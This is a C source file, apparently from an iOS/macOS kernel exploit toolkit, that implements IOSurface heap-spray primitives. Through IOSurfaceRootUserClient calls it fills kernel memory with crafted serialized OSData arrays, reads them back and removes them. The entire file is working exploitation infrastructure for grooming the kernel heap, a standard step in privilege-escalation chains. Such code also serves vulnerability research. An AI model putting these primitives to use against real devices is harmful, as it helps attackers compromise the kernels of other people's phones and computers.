/*
 * iosurface.c
 * Brandon Azad
 */
#define IOSURFACE_EXTERN
#include "iosurface.h"

// ---- Global variables --------------------------------------------------------------------------

// Is the IOSurface subsystem initialized?
static bool IOSurface_initialized;

// ---- Functions ---------------------------------------------------------------------------------

#define ERROR(str, ...) printf("[-] "str, ##__VA_ARGS__)
bool
IOSurface_init(void) {
	if (IOSurface_initialized) {
		return true;
	}
	IOSurfaceRoot = IOServiceGetMatchingService(
			kIOMasterPortDefault,
			IOServiceMatching("IOSurfaceRoot"));
	if (IOSurfaceRoot == MACH_PORT_NULL) {
		ERROR("could not find %s", "IOSurfaceRoot");
		return false;
	}
	kern_return_t kr = IOServiceOpen(
			IOSurfaceRoot,
			mach_task_self(),
			0,
			&IOSurfaceRootUserClient);
	if (kr != KERN_SUCCESS) {
		ERROR("could not open %s", "IOSurfaceRootUserClient");
		return false;
	}
	struct _IOSurfaceFastCreateArgs create_args = { .alloc_size = 0x4000, };
	struct IOSurfaceLockResult lock_result;
    
    extern uint32_t create_outsize;
	size_t lock_result_size = create_outsize;
	kr = IOConnectCallMethod(
			IOSurfaceRootUserClient,
			6, // create_surface_client_fast_path
			NULL, 0,
			&create_args, sizeof(create_args),
			NULL, NULL,
			&lock_result, &lock_result_size);
	if (kr != KERN_SUCCESS) {
		ERROR("could not create %s: 0x%x", "IOSurfaceClient", kr);
		return false;
	}
	IOSurface_id = lock_result.surface_id;
    if (!IOSurface_id) {
        IOSurface_id = (uint32_t)lock_result.addr3;
    }
	IOSurface_initialized = true;
	return true;
}

void
IOSurface_deinit(void) {
	assert(IOSurface_initialized);
	IOSurface_initialized = false;
	IOSurface_id = 0;
	IOServiceClose(IOSurfaceRootUserClient);
	IOObjectRelease(IOSurfaceRoot);
}

/*
 * IOSurface_set_value
 *
 * Description:
 * 	A wrapper around IOSurfaceRootUserClient::set_value().
 */
bool
IOSurface_set_value(const struct IOSurfaceValueArgs *args, size_t args_size) {
	struct IOSurfaceValueResultArgs result;
	size_t result_size = sizeof(result);
	kern_return_t kr = IOConnectCallMethod(
			IOSurfaceRootUserClient,
			9, // set_value
			NULL, 0,
			args, args_size,
			NULL, NULL,
			&result, &result_size);
	if (kr != KERN_SUCCESS) {
		ERROR("failed to %s value in %s: 0x%x", "set", "IOSurface", kr);
		return false;
	}
	return true;
}

/*
 * IOSurface_get_value
 *
 * Description:
 * 	A wrapper around IOSurfaceRootUserClient::get_value().
 */
static bool
IOSurface_get_value(const struct IOSurfaceValueArgs *in, size_t in_size,
		struct IOSurfaceValueArgs *out, size_t *out_size) {
	kern_return_t kr = IOConnectCallMethod(
			IOSurfaceRootUserClient,
			10, // get_value
			NULL, 0,
			in, in_size,
			NULL, NULL,
			out, out_size);
	if (kr != KERN_SUCCESS) {
		ERROR("failed to %s value in %s: 0x%x", "get", "IOSurface", kr);
		return false;
	}
	return true;
}

/*
 * IOSurface_remove_value
 *
 * Description:
 * 	A wrapper around IOSurfaceRootUserClient::remove_value().
 */
static bool
IOSurface_remove_value(const struct IOSurfaceValueArgs *args, size_t args_size) {
	struct IOSurfaceValueResultArgs result;
	size_t result_size = sizeof(result);
	kern_return_t kr = IOConnectCallMethod(
			IOSurfaceRootUserClient,
			11, // remove_value
			NULL, 0,
			args, args_size,
			NULL, NULL,
			&result, &result_size);
	if (kr != KERN_SUCCESS) {
		ERROR("failed to %s value in %s: 0x%x", "remove", "IOSurface", kr);
		return false;
	}
	return true;
}

/*
 * base255_encode
 *
 * Description:
 * 	Encode an integer so that it does not contain any null bytes.
 */
static uint32_t
base255_encode(uint32_t value) {
	uint32_t encoded = 0;
	for (unsigned i = 0; i < sizeof(value); i++) {
		encoded |= ((value % 255) + 1) << (8 * i);
		value /= 255;
	}
	return encoded;
}

/*
 * xml_units_for_data_size
 *
 * Description:
 * 	Return the number of XML units needed to store the given size of data in an OSString.
 */
static size_t
xml_units_for_data_size(size_t data_size) {
	return ((data_size - 1) + sizeof(uint32_t) - 1) / sizeof(uint32_t);
}

/*
 * serialize_IOSurface_data_array
 *
 * Description:
 * 	Create the template of the serialized array to pass to IOSurfaceUserClient::set_value().
 * 	Returns the size of the serialized data in bytes.
 */
static size_t
serialize_IOSurface_data_array(uint32_t *xml0, uint32_t array_length, uint32_t data_size,
		uint32_t **xml_data, uint32_t **key) {
	uint32_t *xml = xml0;
	*xml++ = kOSSerializeBinarySignature;
	*xml++ = kOSSerializeArray | 2 | kOSSerializeEndCollection;
	*xml++ = kOSSerializeArray | array_length;
	for (size_t i = 0; i < array_length; i++) {
		uint32_t flags = (i == array_length - 1 ? kOSSerializeEndCollection : 0);
		*xml++ = kOSSerializeData | (data_size - 1) | flags;
		xml_data[i] = xml;
		xml += xml_units_for_data_size(data_size);
	}
	*xml++ = kOSSerializeSymbol | sizeof(uint32_t) + 1 | kOSSerializeEndCollection;
	*key = xml++;		// This will be filled in on each array loop.
	*xml++ = 0;		// Null-terminate the symbol.
	return (xml - xml0) * sizeof(*xml);
}

/*
 * IOSurface_spray_with_gc_internal
 *
 * Description:
 * 	A generalized version of IOSurface_spray_with_gc() and IOSurface_spray_size_with_gc().
 */

static uint32_t total_arrays = 0;
static bool
IOSurface_spray_with_gc_internal(uint32_t array_count, uint32_t array_length, uint32_t extra_count,
		void *data, uint32_t data_size,
		void (^callback)(uint32_t array_id, uint32_t data_id, void *data, size_t size)) {
	assert(array_count <= 0xffffff);
	assert(array_length <= 0xffff);
	assert(data_size <= 0xffffff);
	assert(extra_count < array_count);
	// Make sure our IOSurface is initialized.
	bool ok = IOSurface_init();
	if (!ok) {
		return 0;
	}
	// How big will our OSUnserializeBinary dictionary be?
	uint32_t current_array_length = array_length + (extra_count > 0 ? 1 : 0);
	size_t xml_units_per_data = xml_units_for_data_size(data_size);
	size_t xml_units = 1 + 1 + 1 + (1 + xml_units_per_data) * current_array_length + 1 + 1 + 1;
	// Allocate the args struct.
	struct IOSurfaceValueArgs *args;
	size_t args_size = sizeof(*args) + xml_units * sizeof(args->xml[0]);
	args = malloc(args_size);
	assert(args != 0);
	// Build the IOSurfaceValueArgs.
	args->surface_id = IOSurface_id;
	// Create the serialized OSArray. We'll remember the locations we need to fill in with our
	// data as well as the slot we need to set our key.
	uint32_t **xml_data = malloc(current_array_length * sizeof(*xml_data));
	assert(xml_data != NULL);
	uint32_t *key;
	size_t xml_size = serialize_IOSurface_data_array(args->xml,
			current_array_length, data_size, xml_data, &key);
	assert(xml_size == xml_units * sizeof(args->xml[0]));
	// Keep track of when we need to do GC.
	size_t sprayed = 0;
	size_t next_gc_step = 0;
	// Loop through the arrays.
	for (uint32_t array_id = 0; array_id < array_count; array_id++) {
		// If we've crossed the GC sleep boundary, sleep for a bit and schedule the
		// next one.
		// Now build the array and its elements.
		*key = base255_encode(total_arrays + array_id);
		for (uint32_t data_id = 0; data_id < current_array_length; data_id++) {
			// Update the data for this spray if the user requested.
			if (callback != NULL) {
				callback(array_id, data_id, data, data_size);
			}
			// Copy in the data to the appropriate slot.
			memcpy(xml_data[data_id], data, data_size - 1);
		}
		// Finally set the array in the surface.
		ok = IOSurface_set_value(args, args_size);
		if (!ok) {
			free(args);
			free(xml_data);
			return false;
		}
		if (ok) {
			sprayed += data_size * current_array_length;
			// If we just sprayed an array with an extra element, decrement the
			// outstanding extra_count.
			if (current_array_length > array_length) {
				assert(extra_count > 0);
				extra_count--;
				// If our extra_count is now 0, rebuild our serialized array. (We
				// could implement this as a memmove(), but I'm lazy.)
				if (extra_count == 0) {
					current_array_length--;
					serialize_IOSurface_data_array(args->xml,
							current_array_length, data_size,
							xml_data, &key);
				}
			}
		}
	}
	if (next_gc_step > 0) {
		// printf("\n");
	}
	// Clean up resources.
	free(args);
	free(xml_data);
	total_arrays += array_count;
	return true;
}

bool
IOSurface_spray_with_gc(uint32_t array_count, uint32_t array_length,
		void *data, uint32_t data_size,
		void (^callback)(uint32_t array_id, uint32_t data_id, void *data, size_t size)) {
	return IOSurface_spray_with_gc_internal(array_count, array_length, 0,
			data, data_size, callback);
}

bool
IOSurface_spray_size_with_gc(uint32_t array_count, size_t spray_size,
		void *data, uint32_t data_size,
		void (^callback)(uint32_t array_id, uint32_t data_id, void *data, size_t size)) {
	assert(array_count <= 0xffffff);
	assert(data_size <= 0xffffff);
	size_t data_count = (spray_size + data_size - 1) / data_size;
	size_t array_length = data_count / array_count;
	size_t extra_count = data_count % array_count;
	assert(array_length <= 0xffff);
	return IOSurface_spray_with_gc_internal(array_count, (uint32_t) array_length,
			(uint32_t) extra_count, data, data_size, callback);
}

bool
IOSurface_spray_read_array(uint32_t array_id, uint32_t array_length, uint32_t data_size,
		void (^callback)(uint32_t data_id, void *data, size_t size)) {
	assert(IOSurface_initialized);
	assert(array_id < 0xffffff);
	assert(array_length <= 0xffff);
	assert(data_size <= 0xffffff);
	bool success = false;
	// Create the input args.
	struct IOSurfaceValueArgs_string args_in = {};
	args_in.surface_id = IOSurface_id;
	args_in.string_data = base255_encode(array_id);
	// Create the output args.
	size_t xml_units_per_data = xml_units_for_data_size(data_size);
	size_t xml_units = 1 + 1 + (1 + xml_units_per_data) * array_length;
	struct IOSurfaceValueArgs *args_out;
	size_t args_out_size = sizeof(*args_out) + xml_units * sizeof(args_out->xml[0]);
	// Over-allocate the output buffer a little bit. This allows us to directly pass the inline
	// data to the client without having to worry about the fact that the kernel data is 1 byte
	// shorter (which otherwise would produce an out-of-bounds read on the last element for
	// certain data sizes). Yeah, it's a hack, deal with it.
	args_out = malloc(args_out_size + sizeof(uint32_t));
	assert(args_out != 0);
	// Get the value.
	bool ok = IOSurface_get_value((struct IOSurfaceValueArgs *)&args_in, sizeof(args_in),
			args_out, &args_out_size);
	if (!ok) {
		goto fail;
	}
	// Do the ugly parsing ourselves. :(
	uint32_t *xml = args_out->xml;
	if (*xml++ != kOSSerializeBinarySignature) {
		ERROR("did not find OSSerializeBinary signature");
		goto fail;
	}
	if (*xml++ != (kOSSerializeArray | array_length | kOSSerializeEndCollection)) {
		ERROR("unexpected container");
		goto fail;
	}
	for (uint32_t data_id = 0; data_id < array_length; data_id++) {
		uint32_t flags = (data_id == array_length - 1 ? kOSSerializeEndCollection : 0);
		if (*xml++ != (kOSSerializeString | data_size - 1 | flags)) {
			ERROR("unexpected data: 0x%x != 0x%x at index %u",
					xml[-1], kOSSerializeString | data_size - 1 | flags,
					data_id);
			goto fail;
		}
		callback(data_id, (void *)xml, data_size);
		xml += xml_units_per_data;
	}
	success = true;
fail:
	free(args_out);
	return success;
}

bool
IOSurface_spray_read_all_data(uint32_t array_count, uint32_t array_length, uint32_t data_size,
		void (^callback)(uint32_t array_id, uint32_t data_id, void *data, size_t size)) {
	assert(IOSurface_initialized);
	assert(array_count <= 0xffffff);
	assert(array_length <= 0xffff);
	assert(data_size <= 0xffffff);
	bool ok = true;
	//TODO: We should probably amortize the creation of the output buffer.
	for (uint32_t array_id = 0; array_id < array_count; array_id++) {
		ok &= IOSurface_spray_read_array(array_id, array_length, data_size,
				^(uint32_t data_id, void *data, size_t size) {
			callback(array_id, data_id, data, size);
		});
	}
	return ok;
}

bool
IOSurface_spray_remove_array(uint32_t array_id) {
	assert(IOSurface_initialized);
	assert(array_id < 0xffffff);
	struct IOSurfaceValueArgs_string args = {};
	args.surface_id = IOSurface_id;
	args.string_data = base255_encode(array_id);
	return IOSurface_remove_value((struct IOSurfaceValueArgs *)&args, sizeof(args));
}

bool
IOSurface_spray_clear(uint32_t array_count) {
	assert(IOSurface_initialized);
	assert(array_count <= 0xffffff);
	bool ok = true;
	for (uint32_t array_id = 0; array_id < array_count; array_id++) {
		ok &= IOSurface_spray_remove_array(array_id);
	}
	return ok;
}
